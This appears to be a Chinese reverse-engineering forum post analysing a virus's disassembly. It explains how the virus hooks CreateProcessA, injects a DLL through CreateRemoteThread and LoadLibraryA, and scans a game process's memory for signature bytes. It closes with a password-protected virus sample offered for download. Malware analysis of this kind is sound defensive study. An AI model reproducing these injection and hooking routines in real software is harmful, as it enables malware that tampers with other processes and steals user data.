+CODE:00402E40                 push    eax             ; lpBuffer  
+CODE:00402E41                 push    esi             ; lpBaseAddress  
+CODE:00402E42                 mov     eax, \[ebp+hProcess\]  
+CODE:00402E45                 push    eax             ; hProcess  
+CODE:00402E46                 call    WriteProcessMemory  
+CODE:00402E4B                 mov     \[esi\], bl  ；\[esi\]为“CreateProcessA”的入口  
+，bl="E9"，对应的汇编指令为“JMP”,使“CreateProcessA”的入口变成一个跳转指  
+令  
+CODE:00402E4D                 inc     edi  ；使\[edi\]指向跳转的偏移值  
+CODE:00402E4E                 mov     eax, \[ebp+var\_C\]   ；\[ebp+var\_C\]为偏移量  
+CODE:00402E51                 mov     \[edi\], eax  ；“CreateProcessA”的入变  
+成“JMP xxxxxx”的形式，实现 hook“CreateProcessA”函数  
+  
+6.由于“CreateProcessA”的入口已改变，但病毒要实现创建线程的功能，所以跳 到病毒 hook“CreateProcessA”函数 sub\_403CB0 后必须要把“CreateProcessA”的入口恢复  
+  
+CODE:00402DD6                 lea     eax, \[ebp+NumberOfBytesWritten\]  
+CODE:00402DD9                 push    eax             ; lpNumberOfBytesWritten  
+CODE:00402DDA                 push    edi             ; nSize  
+CODE:00402DDB                 mov     eax, \[ebp+lpBuffer\]  
+CODE:00402DDE                 push    eax             ; lpBuffer  ；原来保存  
+“CreateProcessA”的入口内容的换成区  
+CODE:00402DDF                 push    esi             ; lpBaseAddress  ；  
+“CreateProcessA”的入口地址  
+CODE:00402DE0                 push    ebx             ; hProcess  
+CODE:00402DE1                 call    WriteProcessMemory  
+  
+7.通过 CreateProcessA 创建进程  
+CODE:00403CD4                 push    ebx  
+CODE:00403CD5                 mov     eax, \[ebp+arg\_20\]  
+......  
+......  
+CODE:00403CF2                 mov     eax, \[ebp+arg\_0\]  
+CODE:00403CF5                 push    eax  
+CODE:00403CF6                 call    ds:dword\_40AFBC      
+  
+;dword\_40AFBC 为“CreateProcessA”的入口地址  
+  
+8.实现 DLL 注入的方法：在游戏进程里申请一块内存并把 DLL 名写进去，把进程空间中的 LoadLibrary 函数当成线程来执行，输入的参数是前面申请的地址（已把 DLL 名写进去），这样 LoadLibrary 函数执行到 ret 时，远程线程结束，但 DLL 也被载入目标进程，这样就可执行 DLL 中的代码  
+  
+CODE:00402E66                 push    eax             ; dwProcessId  ;当前进程  
+CODE:00402E67                 push    0               ; bInheritHandle  
+CODE:00402E69                 push    1F0FFFh         ; dwDesiredAccess  
+CODE:00402E6E                 call    OpenProcess  
+CODE:00402E73                 mov     ebx, eax  
+CODE:00402E75                 push    4               ; flProtect  
+CODE:00402E77                 push    1000h           ; flAllocationType  
+CODE:00402E7C                 push    104h            ; dwSize  
+CODE:00402E81                 push    0               ; lpAddress  
+CODE:00402E83                 push    ebx             ; hProcess  
+CODE:00402E84                 call    VirtualAllocEx  
+CODE:00402E89                 mov     esi, eax  
+CODE:00402E8B                 push    esp             ; lpNumberOfBytesWritten  
+CODE:00402E8C                 push    104h            ; nSize  
+CODE:00402E91                 push    edi             ; lpBuffer  
+CODE:00402E92                 push    esi             ; lpBaseAddress  ；申请 的内存空间  
+CODE:00402E93                 push    ebx             ; hProcess  
+CODE:00402E94                 call    WriteProcessMemory  
+CODE:00402E99                 push    offset aLoadlibrarya ; "LoadLibraryA"  
+CODE:00402E9E                 push    offset aKernel32\_dll ; "kernel32.dll"  
+CODE:00402EA3                 call    GetModuleHandleA  
+CODE:00402EA8                 push    eax             ; hModule  
+CODE:00402EA9                 call    GetProcAddress  ；获取"LoadLibraryA"的地址  
+CODE:00402EAE                 push    esp             ; lpThreadId  
+CODE:00402EAF                 push    0               ; dwCreationFlags  
+CODE:00402EB1                 push    esi             ; lpParameter，前面申请的地 址  
+CODE:00402EB2                 push    eax             ; lpStartAddress，"LoadLibraryA"的地址  
+CODE:00402EB3                 push    0               ; dwStackSize  
+CODE:00402EB5                 push    0               ; lpThreadAttributes  
+CODE:00402EB7                 push    ebx             ; hProcess  
+CODE:00402EB8                 call    CreateRemoteThread  
+  
+二.搜索游戏进程匹配特征码  
+  
+CODE:0040401D                 lea     ebx, \[eax+1000h\]    ；eax  
+为该模块的句柄值  
+CODE:00404023                 lea     esi, \[eax+200000h\]  
+CODE:00404029                 push    0Ch  ；获取页面或读出内容的最小值  
+CODE:0040402B                 push    ebx  ；地址下限  
+CODE:0040402C                 push    esi  ；地址上限  
+CODE:0040402D                 mov     ecx, offset unk\_4060C0；特征码地址  
+CODE:00404032                 xor     edx, edx  ；识别控制  
+CODE:00404034                 mov     eax, \[edi\]；进程句柄  
+CODE:00404036                 call    findGameAddr  
+........  
+........  
+CODE:0040410D                 mov     eax, \[ebp+ThreadId\]  
+CODE:00404110                 mov     ds:dword\_40AFF0, eax  
+CODE:00404115                 push    1               ; dwMilliseconds  
+CODE:00404117                 call    Sleep  
+  
+  
+核心函数就是 findGameAddr，以 CODE:00404036 的为例说明  
+  
+1.首先用\[eax+1000h\]作为搜索的起始地址，循环查找时的下次起始地址就是用 VirtualQueryEx 获得的 MEMORY\_BASIC\_INFORMATION 结构中的 BaseAddress+RegionSize  
+  
+CODE:00402F48                 mov     eax, \[ebp+Buffer.BaseAddress\]  
+CODE:00402F4E                 add     eax, \[ebp+Buffer.RegionSize\]  
+CODE:00402F54                 mov     \[ebp+lpBaseAddress\], eax  
+CODE:00402F57                 mov     eax, \[ebp+lpBaseAddress\]  
+CODE:00402F5A                 cmp     eax, \[ebp+arg\_4\]  
+CODE:00402F5D                 jnb     short loc\_402F65  
+CODE:00402F5F                 mov     eax, \[ebp+arg\_4\]；  \[ebp+arg\_4\]=  
+  
+\[eax+1000h\]  
+CODE:00402F62                 mov     \[ebp+lpBaseAddress\], eax  
+  
+2.限制查找地址的范围在\[eax+1000h\]和\[eax+200000h\]之间  
+  
+mov     eax, \[ebp+lpBaseAddress\]；\[ebp+lpBaseAddress\]查找的开始地址  
+cmp     eax, \[ebp+arg\_0\]  ；\[ebp+arg\_0\]=\[eax+200000h\]  
+ja      loc\_403060    ；跳到结束  
+  
+  
+3.用 VirtualQueryEx 获得相关的内存信息  
+  
+push    1Ch             ; dwLength  
+lea     eax, \[ebp+Buffer\]  
+push    eax             ; lpBuffer，指向 MEMORY\_BASIC\_INFORMATION 结构  
+mov     eax, \[ebp+lpBaseAddress\]  
+push    eax             ; lpAddress，查找的开始地址  
+mov     eax, \[ebp+hProcess\]  
+push    eax             ; hProcess  
+call    VirtualQueryEx  
+  
+4.检查相同属性的页面的范围是否少于传入的参数 0Ch，如果小于的话就跳到 1.  
+  
+继续查找  
+CODE:00402F8F                 mov     eax, \[ebp+Buffer.RegionSize\]  
+CODE:00402F95                 mov     \[ebp+var\_14\], eax  
+CODE:00402F98  
+CODE:00402F98 loc\_402F98:                             ; CODE XREF:   
+  
+findGameAddr+121 j  
+CODE:00402F98                                         ; findGameAddr+16F j  
+CODE:00402F98                 mov     eax, \[ebp+var\_14\]  
+CODE:00402F9B                 cmp     eax, \[ebp+arg\_8\]  
+CODE:00402F9E                 jb      short loc\_402F48  
+  
+5.读取内存页面到指定的缓冲区  
+CODE:00402FD5                 lea     eax, \[ebp+NumberOfBytesRead\]  
+CODE:00402FD8                 push    eax             ; lpNumberOfBytesRead  
+CODE:00402FD9                 push    ebx             ; nSize，为 MEMORY\_BASIC\_INFORMATION 结构中的 RegionSize 和 19000h 两者之间的最小值  
+CODE:00402FDA                 lea     eax, \[ebp+var\_19438\]  ；缓冲区地址  
+CODE:00402FE0                 push    eax             ; lpBuffer  
+CODE:00402FE1                 mov     eax, \[ebp+lpBaseAddress\]  
+CODE:00402FE4                 push    eax             ; lpBaseAddress  
+CODE:00402FE5                 mov     eax, \[ebp+hProcess\]  
+CODE:00402FE8                 push    eax             ; hProcess  
+CODE:00402FE9                 call    ReadProcessMemory  
+CODE:00402FEE                 mov     eax, \[ebp+NumberOfBytesRead\]  
+CODE:00402FF1                 cmp     eax, \[ebp+arg\_8\]  ；读到的实际大  
+小不能小于传入的参数 0Ch  
+CODE:00402FF4                 jb      loc\_402F48  
+  
+6.根据特征码匹配内存，看\[ebp+lpBaseAddress\]是否为对应的内存地址，不是的话跳到 1.重新查找，直到查到内存边界\[eax+200000h\]为止  
+  
+CODE:00403022                 lea     eax, \[ebp+var\_41C\]  ；\[ebp+var\_41C\]  
+为特征码的地址  
+CODE:00403028  
+CODE:00403028 loc\_403028:                             ; CODE XREF: findGameAddr+151 j  
+CODE:00403028                 lea     ebx, \[edi+esi\]  
+CODE:0040302B                 mov     bl, \[ebp+ebx+var\_19438\]  ；  
+\[ebp+ebx+var\_19438\]指向缓冲区的数据  
+CODE:00403032                 cmp     bl, \[eax\]    ；比较数据是否  
+相等  
+CODE:00403034                 jz      short loc\_40303A  
+CODE:00403036                 xor     ecx, ecx  
+CODE:00403038                 jmp     short loc\_40303F  
+CODE:0040303A ; ---------------------------------------------------------------------  
+  
+\------  
+CODE:0040303A  
+CODE:0040303A loc\_40303A:                             ; CODE XREF:   
+  
+findGameAddr+148 j  
+CODE:0040303A                 inc     edi  
+CODE:0040303B                 inc     eax  
+CODE:0040303C                 dec     edx  
+CODE:0040303D                 jnz     short loc\_403028  
+  
+7.如果特征码匹配就把搜到的内存地址返回  
+  
+CODE:0040304D                 add     esi, \[ebp+lpBaseAddress\]  
+CODE:00403050                 mov     \[ebp+var\_C\], esi  
+CODE:00403053                 jmp     short loc\_403060  
+CODE:00403060                 mov     eax, \[ebp+var\_C\]    ；eax  
+为返回的内存地址  
+  
+注意：附件里有一个病毒样品，请小心使用，请勿用于非法用途！！！  
+附件密码：virus
+
+上传的附件
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || 1.rar \[附件请到论坛下载：[`bbs.pediy.com/showthread.php?t=79363`](http://bbs.pediy.com/showthread.php?t=79363) \]   
+ |
